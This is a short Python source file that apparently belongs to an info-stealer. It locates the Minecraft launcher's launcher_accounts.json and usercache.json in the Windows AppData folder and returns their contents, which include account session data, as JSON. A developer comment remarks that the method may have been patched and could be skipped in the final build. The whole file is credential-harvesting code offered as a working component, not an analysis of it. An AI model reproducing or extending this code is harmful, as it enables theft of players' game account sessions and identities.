# i think this has been patched. it certanly cant hurt, although probably skip on final
import json
import os

roaming = os.getenv("appdata")
accounts_path = "\\.minecraft\\launcher_accounts.json"
usercache_path = "\\.minecraft\\usercache.json"

def start():
    return session_info(), user_cache()

def session_info():
    if os.path.exists(roaming + accounts_path):
        with open(roaming + accounts_path, "r") as g:
            session = json.load(g)
            return json.dumps(session, indent=4)

def user_cache():
    if os.path.exists(roaming + usercache_path):
        with open(roaming + usercache_path, "r") as g:
            user = json.load(g)
            return json.dumps(user, indent=4)